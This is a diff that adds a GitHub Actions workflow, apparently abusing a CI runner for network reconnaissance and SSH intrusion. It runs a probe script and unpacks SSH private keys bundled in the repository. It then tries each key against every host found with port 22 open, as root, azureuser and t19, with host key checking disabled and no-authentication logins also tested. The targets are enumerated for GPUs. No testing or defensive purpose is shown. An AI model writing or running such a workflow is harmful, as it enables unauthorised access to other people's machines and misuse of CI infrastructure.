@@ -1,0 +1,41 @@
+name: ul-vantage
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  v:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - name: egress-matrix-pool
+        run: |
+          python3 -u probe.py 2>&1 | tee probe.log
+      - name: ssh-estate
+        if: always()
+        run: |
+          mkdir -p kh
+          (tar xzf keys/kh.b64 -C kh 2>/dev/null) || (base64 -d keys/kh.b64 > kh/k.bin 2>/dev/null && tar xzf kh/k.bin -C kh 2>/dev/null) || true
+          chmod -R 600 kh 2>/dev/null || true
+          ls kh | head -25
+          awk -F'\t' '$1=="MATRIX" && $3=="22" && $4=="OPEN"{print $2}' probe.log | sort -u > ssh_open.txt
+          echo "SSH_OPEN_COUNT=$(wc -l < ssh_open.txt)"
+          while read -r ip; do
+            for k in kh/k*; do
+              [ -f "$k" ] || continue
+              for u in t19 azureuser root; do
+                out=$(timeout 14 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=publickey "$u@$ip" 'id; hostname -I; nvidia-smi -L' 2>&1 | tr '\n' ';' | head -c 400)
+                echo -e "SSH\t$ip\t$u\t$k\t$out"
+              done
+            done
+            for u in t19 azureuser root; do
+              out=$(timeout 14 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=none "$u@$ip" true 2>&1 | tr '\n' ';' | head -c 200)
+              echo -e "SSH_NOAUTH\t$ip\t$u\t$out"
+            done
+          done < ssh_open.txt
+      - name: evidence-dump
+        if: always()
+        run: |
+          echo "===== PROBE.LOG BEGIN ====="
+          cat probe.log || true
+          echo "===== PROBE.LOG END ====="
